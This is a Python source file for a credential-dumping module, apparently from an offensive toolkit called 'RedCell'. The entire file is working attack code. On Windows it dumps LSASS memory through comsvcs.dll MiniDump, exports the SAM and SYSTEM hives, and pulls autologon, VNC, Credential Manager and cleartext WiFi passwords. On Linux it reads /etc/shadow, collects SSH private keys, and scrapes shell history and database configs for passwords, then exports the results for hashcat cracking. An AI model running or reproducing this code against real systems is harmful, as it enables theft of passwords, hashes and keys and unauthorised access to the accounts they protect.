"""
Credential Dumping Module

Tools for extracting credentials from Windows and Linux systems.
"""

import os
import subprocess
import platform
import re
import tempfile
from typing import List, Dict, Optional
from dataclasses import dataclass, asdict
import json


@dataclass
class Credential:
    """Represents a dumped credential."""
    username: str
    credential_type: str  # 'hash', 'password', 'token'
    value: str
    source: str
    domain: Optional[str] = None
    metadata: Optional[Dict] = None

    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return asdict(self)


class CredentialDumper:
    """
    Credential dumping for Windows and Linux systems.

    Windows:
    - LSASS memory dumping
    - SAM database extraction
    - Registry credential extraction
    - Credential Manager dumps

    Linux:
    - /etc/shadow extraction
    - Memory credential scraping
    - SSH key collection
    - Browser credential extraction
    """

    def __init__(self):
        """Initialize credential dumper."""
        self.os_type = platform.system().lower()
        self.credentials = []

    def dump_all(self) -> List[Credential]:
        """
        Perform comprehensive credential dumping.

        Returns:
            List of dumped credentials
        """
        print(f"[*] Dumping credentials on {self.os_type}...")

        if 'windows' in self.os_type:
            self._dump_windows()
        elif 'linux' in self.os_type:
            self._dump_linux()
        else:
            print(f"[-] Unsupported OS: {self.os_type}")

        return self.credentials

    # ==================== Windows Credential Dumping ====================

    def _dump_windows(self):
        """Dump Windows credentials."""
        print("[*] Dumping Windows credentials...")

        self._dump_lsass()
        self._dump_sam()
        self._dump_registry_credentials()
        self._dump_credential_manager()
        self._dump_wifi_passwords()

    def _dump_lsass(self) -> bool:
        """
        Dump LSASS memory.

        Returns:
            True if successful
        """
        print("[*] Attempting LSASS dump...")

        try:
            # Method 1: Try using comsvcs.dll (native Windows DLL)
            dump_path = os.path.join(tempfile.gettempdir(), 'lsass.dmp')

            # Get LSASS PID
            result = subprocess.run(
                ['tasklist', '/FI', 'IMAGENAME eq lsass.exe', '/FO', 'CSV', '/NH'],
                capture_output=True,
                text=True,
                timeout=10
            )

            # Parse PID
            if result.returncode == 0:
                match = re.search(r'"lsass.exe","(\d+)"', result.stdout)
                if match:
                    lsass_pid = match.group(1)

                    # Dump LSASS using rundll32
                    dump_cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {lsass_pid} {dump_path} full'

                    result = subprocess.run(
                        dump_cmd,
                        shell=True,
                        capture_output=True,
                        timeout=30
                    )

                    if os.path.exists(dump_path):
                        print(f"[+] LSASS dumped to: {dump_path}")
                        print(f"[*] Use Mimikatz or pypykatz to parse: {dump_path}")

                        self.credentials.append(Credential(
                            username='N/A',
                            credential_type='lsass_dump',
                            value=dump_path,
                            source='lsass_memory',
                            metadata={'size': os.path.getsize(dump_path)}
                        ))
                        return True

        except Exception as e:
            print(f"[-] Error dumping LSASS: {e}")

        return False

    def _dump_sam(self) -> bool:
        """
        Dump SAM database hashes.

        Returns:
            True if successful
        """
        print("[*] Attempting SAM dump...")

        try:
            output_dir = tempfile.gettempdir()

            # Use reg save to export SAM and SYSTEM hives
            sam_path = os.path.join(output_dir, 'sam.save')
            system_path = os.path.join(output_dir, 'system.save')

            # Save SAM
            subprocess.run(
                ['reg', 'save', 'HKLM\\SAM', sam_path, '/y'],
                capture_output=True,
                timeout=10
            )

            # Save SYSTEM
            subprocess.run(
                ['reg', 'save', 'HKLM\\SYSTEM', system_path, '/y'],
                capture_output=True,
                timeout=10
            )

            if os.path.exists(sam_path) and os.path.exists(system_path):
                print(f"[+] SAM dumped to: {sam_path}")
                print(f"[+] SYSTEM dumped to: {system_path}")
                print(f"[*] Use secretsdump.py or similar to extract hashes")

                self.credentials.append(Credential(
                    username='N/A',
                    credential_type='sam_dump',
                    value=f"{sam_path}|{system_path}",
                    source='sam_database'
                ))
                return True

        except Exception as e:
            print(f"[-] Error dumping SAM: {e}")

        return False

    def _dump_registry_credentials(self):
        """Dump credentials from Windows registry."""
        print("[*] Checking registry for credentials...")

        # Check for autologon credentials
        try:
            result = subprocess.run(
                ['reg', 'query', r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', '/v', 'DefaultPassword'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                password = re.search(r'DefaultPassword\s+REG_SZ\s+(.+)', result.stdout)
                if password:
                    # Get username
                    user_result = subprocess.run(
                        ['reg', 'query', r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', '/v', 'DefaultUserName'],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )

                    username = 'Unknown'
                    if user_result.returncode == 0:
                        user_match = re.search(r'DefaultUserName\s+REG_SZ\s+(.+)', user_result.stdout)
                        if user_match:
                            username = user_match.group(1).strip()

                    self.credentials.append(Credential(
                        username=username,
                        credential_type='password',
                        value=password.group(1).strip(),
                        source='registry_autologon'
                    ))
                    print(f"[+] Found autologon credential: {username}")

        except Exception as e:
            print(f"[-] Error checking registry credentials: {e}")

        # Check for VNC passwords
        self._dump_vnc_passwords()

    def _dump_vnc_passwords(self):
        """Dump VNC passwords from registry."""
        vnc_keys = [
            r'HKCU\Software\ORL\WinVNC3\Password',
            r'HKLM\SOFTWARE\RealVNC\WinVNC4\Password',
        ]

        for key in vnc_keys:
            try:
                result = subprocess.run(
                    ['reg', 'query', key],
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if result.returncode == 0 and 'Password' in result.stdout:
                    self.credentials.append(Credential(
                        username='VNC',
                        credential_type='encrypted_password',
                        value=result.stdout,
                        source='registry_vnc'
                    ))
                    print("[+] Found VNC password in registry")

            except:
                pass

    def _dump_credential_manager(self):
        """Dump Windows Credential Manager."""
        print("[*] Dumping Credential Manager...")

        try:
            result = subprocess.run(
                ['cmdkey', '/list'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                # Parse credential targets
                targets = re.findall(r'Target:\s+(.+)', result.stdout)

                for target in targets:
                    self.credentials.append(Credential(
                        username='N/A',
                        credential_type='stored_credential',
                        value=target.strip(),
                        source='credential_manager'
                    ))

                if targets:
                    print(f"[+] Found {len(targets)} stored credentials")

        except Exception as e:
            print(f"[-] Error dumping Credential Manager: {e}")

    def _dump_wifi_passwords(self):
        """Dump saved WiFi passwords."""
        print("[*] Dumping WiFi passwords...")

        try:
            # Get list of WiFi profiles
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                profiles = re.findall(r'All User Profile\s+:\s+(.+)', result.stdout)

                for profile in profiles:
                    profile = profile.strip()

                    # Get profile details
                    detail_result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )

                    if detail_result.returncode == 0:
                        password = re.search(r'Key Content\s+:\s+(.+)', detail_result.stdout)

                        if password:
                            self.credentials.append(Credential(
                                username=profile,
                                credential_type='wifi_password',
                                value=password.group(1).strip(),
                                source='windows_wifi'
                            ))
                            print(f"[+] Found WiFi password for: {profile}")

        except Exception as e:
            print(f"[-] Error dumping WiFi passwords: {e}")

    # ==================== Linux Credential Dumping ====================

    def _dump_linux(self):
        """Dump Linux credentials."""
        print("[*] Dumping Linux credentials...")

        self._dump_shadow()
        self._dump_ssh_keys()
        self._dump_bash_history()
        self._dump_config_files()

    def _dump_shadow(self) -> bool:
        """
        Dump /etc/shadow file.

        Returns:
            True if successful
        """
        print("[*] Attempting to read /etc/shadow...")

        try:
            if os.path.exists('/etc/shadow'):
                with open('/etc/shadow', 'r') as f:
                    shadow_content = f.read()

                # Parse shadow entries
                for line in shadow_content.split('\n'):
                    if line and not line.startswith('#'):
                        parts = line.split(':')

                        if len(parts) >= 2:
                            username = parts[0]
                            password_hash = parts[1]

                            if password_hash and password_hash not in ['*', '!', '!!']:
                                self.credentials.append(Credential(
                                    username=username,
                                    credential_type='hash',
                                    value=password_hash,
                                    source='/etc/shadow'
                                ))

                print(f"[+] Extracted hashes from /etc/shadow")
                return True

        except PermissionError:
            print("[-] Permission denied reading /etc/shadow")
        except Exception as e:
            print(f"[-] Error reading /etc/shadow: {e}")

        return False

    def _dump_ssh_keys(self):
        """Collect SSH private keys."""
        print("[*] Searching for SSH private keys...")

        ssh_locations = [
            os.path.expanduser('~/.ssh'),
            '/root/.ssh',
            '/home/*/.ssh'
        ]

        for location in ssh_locations:
            try:
                if '*' in location:
                    # Glob expansion
                    import glob
                    paths = glob.glob(location)
                else:
                    paths = [location] if os.path.exists(location) else []

                for ssh_dir in paths:
                    if os.path.isdir(ssh_dir):
                        for filename in os.listdir(ssh_dir):
                            filepath = os.path.join(ssh_dir, filename)

                            # Look for private keys
                            if os.path.isfile(filepath) and not filename.endswith('.pub'):
                                try:
                                    with open(filepath, 'r') as f:
                                        content = f.read(100)  # Read first 100 chars

                                    if 'PRIVATE KEY' in content:
                                        self.credentials.append(Credential(
                                            username=os.path.basename(os.path.dirname(ssh_dir)),
                                            credential_type='ssh_private_key',
                                            value=filepath,
                                            source='ssh_directory'
                                        ))
                                        print(f"[+] Found SSH private key: {filepath}")

                                except:
                                    pass

            except Exception as e:
                pass

    def _dump_bash_history(self):
        """Search bash history for credentials."""
        print("[*] Searching bash history for credentials...")

        history_files = [
            os.path.expanduser('~/.bash_history'),
            os.path.expanduser('~/.zsh_history'),
            '/root/.bash_history'
        ]

        # Patterns to look for
        patterns = [
            r'password[=\s]+["\']?([^\s"\']+)',
            r'passwd[=\s]+["\']?([^\s"\']+)',
            r'mysql.*-p\s*([^\s]+)',
            r'psql.*password\s*([^\s]+)',
        ]

        for history_file in history_files:
            try:
                if os.path.exists(history_file):
                    with open(history_file, 'r') as f:
                        content = f.read()

                    for pattern in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)

                        for match in matches:
                            if match and len(match) > 3:  # Avoid false positives
                                self.credentials.append(Credential(
                                    username='N/A',
                                    credential_type='password',
                                    value=match,
                                    source=f'bash_history:{history_file}'
                                ))

            except Exception as e:
                pass

    def _dump_config_files(self):
        """Search configuration files for credentials."""
        print("[*] Searching configuration files...")

        config_files = [
            '/etc/mysql/my.cnf',
            '/etc/postgresql/postgresql.conf',
            os.path.expanduser('~/.my.cnf'),
            os.path.expanduser('~/.pgpass'),
        ]

        for config_file in config_files:
            try:
                if os.path.exists(config_file):
                    with open(config_file, 'r') as f:
                        content = f.read()

                    # Look for password entries
                    passwords = re.findall(r'password\s*=\s*["\']?([^\s"\']+)', content, re.IGNORECASE)

                    for password in passwords:
                        if password:
                            self.credentials.append(Credential(
                                username='N/A',
                                credential_type='password',
                                value=password,
                                source=config_file
                            ))
                            print(f"[+] Found password in: {config_file}")

            except Exception as e:
                pass

    # ==================== Common Methods ====================

    def export_credentials(self, filename: str, format: str = 'json'):
        """
        Export credentials to file.

        Args:
            filename: Output filename
            format: Export format (json, csv, hashcat)
        """
        if format == 'json':
            with open(filename, 'w') as f:
                json.dump([c.to_dict() for c in self.credentials], f, indent=2)

        elif format == 'csv':
            import csv

            with open(filename, 'w', newline='') as f:
                if self.credentials:
                    fieldnames = self.credentials[0].to_dict().keys()
                    writer = csv.DictWriter(f, fieldnames=fieldnames)
                    writer.writeheader()
                    writer.writerows([c.to_dict() for c in self.credentials])

        elif format == 'hashcat':
            with open(filename, 'w') as f:
                for cred in self.credentials:
                    if cred.credential_type == 'hash':
                        f.write(f"{cred.username}:{cred.value}\n")

        print(f"[+] Exported {len(self.credentials)} credentials to {filename}")

    def generate_report(self) -> str:
        """
        Generate credential dump report.

        Returns:
            Formatted report string
        """
        if not self.credentials:
            return "[+] No credentials found."

        report = []
        report.append("=" * 80)
        report.append("CREDENTIAL DUMP REPORT")
        report.append("=" * 80)
        report.append("")

        # Group by type
        types = {}
        for cred in self.credentials:
            types[cred.credential_type] = types.get(cred.credential_type, 0) + 1

        report.append("SUMMARY:")
        report.append(f"  Total credentials: {len(self.credentials)}")
        report.append("")
        report.append("  By Type:")
        for cred_type, count in types.items():
            report.append(f"    {cred_type}: {count}")
        report.append("")

        # List credentials
        report.append("CREDENTIALS:")
        report.append("-" * 80)

        for i, cred in enumerate(self.credentials, 1):
            report.append(f"[{i}] {cred.credential_type.upper()}")
            report.append(f"    Username: {cred.username}")

            # Truncate long values
            value = cred.value[:60] + "..." if len(cred.value) > 60 else cred.value
            report.append(f"    Value: {value}")
            report.append(f"    Source: {cred.source}")

            if cred.domain:
                report.append(f"    Domain: {cred.domain}")

            report.append("")

        report.append("=" * 80)
        return "\n".join(report)


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Credential Dumper')
    parser.add_argument('--export', help='Export credentials to file')
    parser.add_argument('--format', choices=['json', 'csv', 'hashcat'], default='json',
                       help='Export format')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    dumper = CredentialDumper()

    # Dump credentials
    credentials = dumper.dump_all()

    # Generate report
    print("\n" + dumper.generate_report())

    # Export if requested
    if args.export:
        dumper.export_credentials(args.export, args.format)


if __name__ == '__main__':
    main()
